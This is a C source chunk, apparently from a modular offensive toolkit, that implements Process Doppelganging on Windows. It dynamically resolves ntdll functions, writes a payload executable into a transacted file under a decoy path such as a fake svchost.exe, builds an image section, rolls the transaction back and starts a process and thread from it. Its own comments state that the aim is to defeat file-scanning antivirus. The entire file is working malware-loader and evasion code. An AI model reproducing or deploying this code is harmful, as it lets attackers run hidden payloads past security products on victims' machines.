// chunk: evasion/process_doppelgang
// depends: (none)
// provides: process_doppelgang
// headers: windows.h
// risk: high
// note: Process Doppelganging — uses Transactional NTFS (TxF) to create a process
//       from a file that never exists on disk. Opens a transaction, creates a
//       transacted file, writes payload PE to it, creates a section from the
//       transacted file, rolls back the transaction (file vanishes), then creates
//       a process from the section. The process appears to be backed by a legitimate
//       file but the payload PE was never committed to disk. Defeats file-scanning
//       AVs since the file is never visible to non-transacted readers.
//       All Nt* functions resolved dynamically from ntdll.

#ifndef CHUNK_PROCESS_DOPPELGANG
#define CHUNK_PROCESS_DOPPELGANG

#include <windows.h>

/* UNICODE_STRING not in MinGW headers */
#ifndef UNICODE_STRING_DEFINED
#define UNICODE_STRING_DEFINED
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
#endif

/* NT function typedefs */
typedef NTSTATUS (NTAPI *pfnNtCreateTransaction)(
    PHANDLE TransactionHandle, ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes, PVOID Uow, HANDLE TmHandle,
    ULONG CreateOptions, ULONG IsolationLevel, ULONG IsolationFlags,
    PLARGE_INTEGER Timeout, PUNICODE_STRING Description);

typedef NTSTATUS (NTAPI *pfnNtRollbackTransaction)(
    HANDLE TransactionHandle, BOOLEAN Wait);

typedef NTSTATUS (NTAPI *pfnNtCreateSection)(
    PHANDLE SectionHandle, ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes, PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection, ULONG AllocationAttributes,
    HANDLE FileHandle);

typedef NTSTATUS (NTAPI *pfnNtCreateProcessEx)(
    PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes, HANDLE ParentProcess,
    ULONG Flags, HANDLE SectionHandle,
    HANDLE DebugPort, HANDLE ExceptionPort, ULONG JobMemberLevel);

typedef NTSTATUS (NTAPI *pfnNtQueryInformationProcess)(
    HANDLE ProcessHandle, ULONG ProcessInformationClass,
    PVOID ProcessInformation, ULONG ProcessInformationLength,
    PULONG ReturnLength);

typedef NTSTATUS (NTAPI *pfnRtlCreateProcessParametersEx)(
    PVOID *pProcessParameters, PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath, PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine, PVOID Environment, PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo, PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData, ULONG Flags);

typedef NTSTATUS (NTAPI *pfnNtCreateThreadEx)(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes, HANDLE ProcessHandle,
    PVOID StartRoutine, PVOID Argument, ULONG CreateFlags,
    SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize,
    PVOID AttributeList);

/* CreateFileTransactedA from kernel32 */
typedef HANDLE (WINAPI *pfnCreateFileTransactedA)(
    LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes, HANDLE hTemplateFile,
    HANDLE hTransaction, PUSHORT pusMiniVersion, PVOID lpExtendedParameter);

/* PEB / process parameters offsets for x64 */
#define PEB_OFFSET_PROCESS_PARAMETERS 0x20

typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID PebBaseAddress;
    ULONG_PTR AffinityMask;
    LONG BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;

/*
 * process_doppelgang: Create a process from a PE payload that never touches disk.
 *
 * payload:      full PE file (not shellcode — a complete EXE)
 * payload_size: size in bytes
 * decoy_path:   path to use for the transacted file (e.g., "C:\\Windows\\Temp\\svchost.exe")
 *
 * Returns the PID of the created process, 0 on failure.
 */
static DWORD process_doppelgang(BYTE *payload, SIZE_T payload_size, const char *decoy_path) {
    if (!decoy_path) decoy_path = "C:\\Windows\\Temp\\tmp_svc.exe";

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    if (!ntdll || !kernel32) return 0;

    /* Resolve all NT functions */
    pfnNtCreateTransaction NtCreateTransaction =
        (pfnNtCreateTransaction)GetProcAddress(ntdll, "NtCreateTransaction");
    pfnNtRollbackTransaction NtRollbackTransaction =
        (pfnNtRollbackTransaction)GetProcAddress(ntdll, "NtRollbackTransaction");
    pfnNtCreateSection NtCreateSection =
        (pfnNtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
    pfnNtCreateProcessEx NtCreateProcessEx =
        (pfnNtCreateProcessEx)GetProcAddress(ntdll, "NtCreateProcessEx");
    pfnNtQueryInformationProcess NtQueryInformationProcess =
        (pfnNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
    pfnNtCreateThreadEx NtCreateThreadEx =
        (pfnNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
    pfnCreateFileTransactedA CreateFileTransactedA =
        (pfnCreateFileTransactedA)GetProcAddress(kernel32, "CreateFileTransactedA");

    if (!NtCreateTransaction || !NtRollbackTransaction || !NtCreateSection ||
        !NtCreateProcessEx || !NtQueryInformationProcess || !NtCreateThreadEx ||
        !CreateFileTransactedA) {
        return 0;
    }

    /* Step 1: Create a transaction */
    HANDLE hTransaction = NULL;
    NTSTATUS status = NtCreateTransaction(
        &hTransaction,
        TRANSACTION_ALL_ACCESS,
        NULL, NULL, NULL,
        0, 0, 0, NULL, NULL);
    if (status != 0 || !hTransaction) return 0;

    /* Step 2: Create a transacted file and write the payload PE */
    HANDLE hFile = CreateFileTransactedA(
        decoy_path,
        GENERIC_WRITE | GENERIC_READ,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hTransaction);
        return 0;
    }

    DWORD bytes_written;
    if (!WriteFile(hFile, payload, (DWORD)payload_size, &bytes_written, NULL) ||
        bytes_written != payload_size) {
        CloseHandle(hFile);
        NtRollbackTransaction(hTransaction, TRUE);
        CloseHandle(hTransaction);
        return 0;
    }

    /* Step 3: Create a section from the transacted file */
    HANDLE hSection = NULL;
    status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL, NULL,
        PAGE_READONLY,
        SEC_IMAGE,   /* Image section — PE loader semantics */
        hFile);

    CloseHandle(hFile);

    if (status != 0 || !hSection) {
        NtRollbackTransaction(hTransaction, TRUE);
        CloseHandle(hTransaction);
        return 0;
    }

    /* Step 4: Roll back the transaction — file vanishes from disk */
    NtRollbackTransaction(hTransaction, TRUE);
    CloseHandle(hTransaction);

    /* Step 5: Create process from the section */
    HANDLE hProcess = NULL;
    status = NtCreateProcessEx(
        &hProcess,
        PROCESS_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        0,           /* Flags: no inherit handles */
        hSection,
        NULL,        /* DebugPort */
        NULL,        /* ExceptionPort */
        0);          /* JobMemberLevel */

    CloseHandle(hSection);

    if (status != 0 || !hProcess) return 0;

    /* Step 6: Query PEB to find entry point */
    PROCESS_BASIC_INFORMATION pbi;
    ULONG ret_len;
    status = NtQueryInformationProcess(hProcess, 0 /* ProcessBasicInformation */,
                                        &pbi, sizeof(pbi), &ret_len);
    if (status != 0) {
        CloseHandle(hProcess);
        return 0;
    }

    /* Read the image base from the PEB (offset 0x10 in PEB for ImageBaseAddress on x64) */
    ULONGLONG image_base = 0;
    SIZE_T bytes_read;
    ReadProcessMemory(hProcess, (BYTE *)pbi.PebBaseAddress + 0x10,
                      &image_base, sizeof(image_base), &bytes_read);

    /* Read PE headers to find AddressOfEntryPoint */
    BYTE dos_hdr[0x40];
    ReadProcessMemory(hProcess, (PVOID)image_base, dos_hdr, sizeof(dos_hdr), &bytes_read);
    DWORD pe_offset = *(DWORD *)(dos_hdr + 0x3C);

    BYTE pe_hdr[0x200];
    ReadProcessMemory(hProcess, (PVOID)(image_base + pe_offset), pe_hdr, sizeof(pe_hdr), &bytes_read);

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)pe_hdr;
    ULONGLONG entry_point = image_base + nt->OptionalHeader.AddressOfEntryPoint;

    /* Step 7: Create initial thread at the entry point */
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (PVOID)entry_point,
        NULL,        /* Argument */
        0,           /* CreateFlags (0 = start immediately) */
        0, 0, 0,
        NULL);

    if (status != 0 || !hThread) {
        CloseHandle(hProcess);
        return 0;
    }

    DWORD pid = GetProcessId(hProcess);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return pid;
}

#endif
